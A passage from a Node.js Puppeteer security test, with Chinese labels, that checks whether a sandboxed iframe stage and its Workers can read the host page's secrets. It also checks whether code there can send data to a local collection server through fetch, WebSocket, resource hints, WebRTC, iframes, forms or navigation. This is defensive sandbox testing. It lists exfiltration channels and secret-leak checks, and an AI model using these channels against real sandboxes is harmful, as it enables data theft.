    const range = /^bytes=(\d+)-(\d*)$/.exec(req.headers.range || '');
    if (range) { const a = Number(range[1]), b = range[2] ? Number(range[2]) : body.length - 1; return send(res, 206, { ...base, 'content-type': type, 'accept-ranges': 'bytes', 'content-range': `bytes ${a}-${b}/${body.length}` }, body.subarray(a, b + 1)); }
    return send(res, 200, { ...base, 'content-type': type, 'accept-ranges': 'bytes' }, body);
  }
  send(res, 404, base, '');
});

const sinkSrv = http.createServer((req, res) => { sink.requests.push(`${req.method} ${req.url}`); send(res, 200, { 'access-control-allow-origin': '*', 'content-type': req.url.includes('.js') ? 'text/javascript' : req.url.includes('.css') ? 'text/css' : req.url.includes('.png') ? 'image/png' : 'text/html' }, req.url.includes('.png') ? png : ''); });
sinkSrv.on('connection', () => { sink.connections++; });
sinkSrv.on('upgrade', (req, socket) => { sink.requests.push(`UPGRADE ${req.url}`); socket.destroy(); });

const sinkUdp = dgram.createSocket('udp4'); sinkUdp.on('message', () => { sink.udp++; });
const listen = (srv, port) => new Promise((res, rej) => { srv.once('error', rej); srv.listen(port, '127.0.0.1', res); });

/* ------------------------------------------------------------------ 跑 */
const fails = []; const notes = [];
const gap = (label, ok, detail = '') => { console.log(`${ok ? '  过' : '缺口'}  ${label}${detail ? `  〔${detail}〕` : ''}`); if (!ok) notes.push(label); };
const check = (label, ok, detail = '') => { console.log(`${ok ? '  过' : '不过'}  ${label}${detail ? `  〔${detail}〕` : ''}`); if (!ok) fails.push(label); };

await listen(editorSrv, BASE); await listen(stageSrv, BASE + 1); await listen(sinkSrv, BASE + 7); await new Promise((res) => sinkUdp.bind(BASE + 7, '127.0.0.1', res));
const browser = await puppeteer.launch({ headless: !HEADFUL, args: [...PROBE_CHROME_ARGS, '--window-position=-32000,-32000', '--mute-audio', ...(process.env.PC_CHROME_ARGS ? process.env.PC_CHROME_ARGS.split(' ') : [])] });
const summary = { chrome: await browser.version() };
try {
  const run = async (mode, nav, only) => {
    sink.requests.length = 0; sink.connections = 0; sink.udp = 0;
    const ctx = await browser.createBrowserContext();
    const page = await ctx.newPage();
    if (process.env.PROBE_DEBUG) { page.on('console', (msg) => console.error('[console]', msg.text().slice(0, 300))); page.on('pageerror', (err) => console.error('[pageerror]', String(err).slice(0, 300))); }
    const popups = []; ctx.on('targetcreated', (t) => { if (t.type() === 'page') popups.push(t.url()); });
    await page.goto(`${EDITOR}/?mode=${mode}${nav ? `&nav=${nav}` : ''}${only ? `&only=${only}` : ''}`, { waitUntil: 'load' });
    // 对照组里表单提交会把舞台自己带走,等不到结果:等一段固定时间,只看收集站
    await page.waitForFunction('window.__done', { timeout: mode === 'control' ? 12_000 : 60_000 }).catch((err) => { if (mode !== 'control') throw err; });
    const results = (await page.evaluate('window.__done')) ?? {};
    await new Promise((r) => setTimeout(r, 1500));
    const alive = await page.evaluate('window.__alive()');
    const topUrl = page.url();
    const out = { results, alive, topUrl, popups: popups.filter((u) => u.startsWith(SINK_ORIGIN)), sinkRequests: [...sink.requests], sinkConnections: sink.connections, sinkUdp: sink.udp };
    await ctx.close();
    return out;
  };

  const g = await run('guarded');
  const m = g.results.main ?? {}, w = g.results.worker ?? {};
  summary.guarded = { main: m, worker: w, grant: g.results.grant, violations: g.results.violations, violationKinds: g.results.violationKinds, sinkRequests: g.sinkRequests, sinkConnections: g.sinkConnections,
    blobTransferMs: g.results.blobTransferMs, bigBlobSliceMs: g.results.bigBlobSliceMs, blobImgCanvas: g.results.blobImgCanvas };
  const leaked = (v) => typeof v === 'string' && /PROBE-|EDITOR-SECRET/.test(v);
  check('舞台里 new Function 执行卡片代码(策略带 unsafe-eval)', g.results.evalOk === true, String(g.results.evalOk));
  check('票据交接:带凭据的跨源请求把票据写成舞台源的 HttpOnly cookie', g.results.grant?.status === 204, JSON.stringify(g.results.grant));
  for (const k of ['parent.document', 'parent.localStorage', 'parent.__ticket', 'top.location.href']) check(`A 读父页:${k} 抛错`, /^抛错:SecurityError/.test(m[k] ?? ''), m[k]);
  check('A opener / frameElement 是空', m.opener === 'null' && m.frameElement === 'null', `${m.opener} / ${m.frameElement}`);
  for (const k of ['localStorage', 'indexedDB', 'document.cookie', 'cookieStore', 'opfs', 'caches', 'realm-scan', 'perf-entries']) check(`A 读本机存储与票据:${k} 里没有秘密`, !leaked(m[k]) && !/pc_rt/.test(m[k] ?? ''), m[k]);
  check('A Worker 里没有父页、文档、localStorage', w['w.parent'] === 'undefined/undefined/undefined', w['w.parent']);
  check('A Worker 的 IndexedDB、cookie 里没有秘密', !leaked(w['w.indexedDB']) && !leaked(w['w.cookieStore']), `${w['w.indexedDB']} / ${w['w.cookieStore']}`);
  check('B 非导航类:收集站 0 个 HTTP 请求', g.sinkRequests.length === 0, `请求 ${g.sinkRequests.length};TCP 连接 ${g.sinkConnections}、UDP 包 ${g.sinkUdp}(逐个向量见下) ${g.sinkRequests.slice(0, 4).join(' ; ')}`);
  check('B 同源脚本地址起的 Worker 被 worker-src 拦下(它不继承文档的策略)', !/跑起来了/.test(m['worker-same-origin-url'] ?? ''), m['worker-same-origin-url']);
  check('B 注册 Service Worker 被拦下', /^抛错/.test(m['service-worker'] ?? ''), m['service-worker']);
  check('B 空白子框架里的 fetch 也带不走(继承策略)', !/到达/.test(m['blank-iframe-realm'] ?? ''), m['blank-iframe-realm']);
  // 逐个向量单独跑一遍,看是哪一个碰到了收集站(TCP 连接、UDP 包、HTTP 请求)
  summary.vectors = {};
  for (const only of ['hint-prefetch', 'hint-preload', 'hint-preconnect', 'hint-dns-prefetch', 'hint-modulepreload', 'webrtc', 'blank-iframe-realm', 'srcdoc-iframe', 'fetch']) {
    const r = await run('guarded', null, only);
    summary.vectors[only] = { tcp: r.sinkConnections, udp: r.sinkUdp, http: r.sinkRequests.length, out: r.results.main?.[only] };
    (only === 'webrtc' ? gap : check)(`B 单独跑 ${only}:收集站没收到任何东西(TCP 连接、UDP 包、HTTP 请求)`, r.sinkConnections === 0 && r.sinkUdp === 0 && r.sinkRequests.length === 0, `tcp ${r.sinkConnections} udp ${r.sinkUdp} http ${r.sinkRequests.length};${r.results.main?.[only] ?? ''}`);
  }
  check('B Worker 里 fetch / WebSocket / importScripts / 再起外部 Worker 都拦下', /^抛错/.test(w['w.fetch'] ?? '') && w['w.websocket'] !== '到达' && /^抛错/.test(w['w.importScripts'] ?? '') && w['w.nested-worker-url'] !== '已建', JSON.stringify([w['w.fetch'], w['w.websocket'], w['w.importScripts'], w['w.nested-worker-url']]));
  check('D 凭 cookie 取到的图片画进 2D 画布读得回像素', m['img-canvas-2d'] === '10,200,30,255', m['img-canvas-2d']);
  check('D 图片进 WebGL2 纹理读得回像素', /^10,200,30,255/.test(m['img-webgl2'] ?? ''), m['img-webgl2']);
  check('D 视频定位后取帧进 WebGL2 纹理读得回像素', /^\d+,\d+,\d+,255/.test(m['video-webgl2'] ?? '') && !/^0,0,0/.test(m['video-webgl2']), m['video-webgl2']);
  check('D cookie 只在自己那一段路径上有效(别的 sid 取不到)', m['media-without-cookie-path'] === '状态:401', m['media-without-cookie-path']);
  check('D Worker 里凭同一张 cookie 取得到素材、拿得到 OffscreenCanvas 的 webgl2', w['w.media-fetch'] === '状态:200' && w['w.offscreen-webgl2'] === '有', `${w['w.media-fetch']} / ${w['w.offscreen-webgl2']}`);
  check('E 宿主递来的 Blob 在舞台里 createObjectURL 后读得回像素', g.results.blobImgCanvas === '10,200,30,255', `${g.results.blobImgCanvas};64 MB Blob 递到 ${g.results.blobTransferMs} ms,切片 ${g.results.bigBlobSliceMs}`);

  summary.nav = {};
  for (const nav of ['self', 'top', 'open', 'meta', 'anchor']) {
    const r = await run('guarded', nav);
    summary.nav[nav] = { sinkRequests: r.sinkRequests, alive: r.alive, topUrl: r.topUrl, popups: r.popups };
    check(`B 导航类(${nav}):收集站 0 个请求,顶层没被带走,没开出新窗口`, r.sinkRequests.length === 0 && r.topUrl.startsWith(EDITOR) && r.popups.length === 0, `请求 ${r.sinkRequests.join(' ; ') || 0};舞台还活着=${r.alive}`);
  }

  {
    const ctx = await browser.createBrowserContext(); const page = await ctx.newPage();
    if (process.env.PROBE_DEBUG) { page.on('console', (msg) => console.error('[console]', msg.text().slice(0, 300))); page.on('pageerror', (err) => console.error('[pageerror]', String(err).slice(0, 300))); }
    await page.goto(`${EDITOR}/harden-host`);
    await page.waitForFunction('window.__h', { timeout: 20_000 });
    const h = await page.evaluate('window.__h'); await ctx.close();
    summary.harden = h;
    const got = Object.entries(h.out).filter(([, v]) => /拿到了|OPENED/.test(v)).map(([k]) => k);
    check('F 加固后本文档没有 RTCPeerConnection', h.out.own === 'undefined', h.out.own);
    gap('F 加固后试过的每条路都没从子框架拿回 RTCPeerConnection', got.length === 0, got.length ? `拿到的路:${got.join('、')}` : `试了 ${Object.keys(h.out).length - 1} 条;兜底摘掉 ${h.tripped} 个`);
    for (const [k, v] of Object.entries(h.out)) console.log(`        ${k}: ${v}`);
  }
  const c = await run('control', 'self');
  summary.control = { sinkRequests: c.sinkRequests.length, sample: c.sinkRequests.slice(0, 40) };
  const seen = (k) => c.sinkRequests.some((q) => q.includes(`${k}=control`) || q.includes(`?${k}control`));
  for (const k of ['fetch', 'xhr', 'beacon', 'img', 'cssbg', 'script', 'iframe', 'form']) check(`C 对照组(无策略、无 sandbox):${k} 到得了收集站`, seen(k) || (k === 'navself' && c.sinkRequests.some((q) => q.includes('navself'))));
} finally {
  await browser.close().catch(() => {});
  for (const s of [editorSrv, stageSrv, sinkSrv]) { s.closeAllConnections?.(); s.close(); }
  sinkUdp.close();
}
console.log(JSON.stringify({ ok: fails.length === 0, fails, notes, ...summary }));
process.exit(fails.length ? 1 : 0);
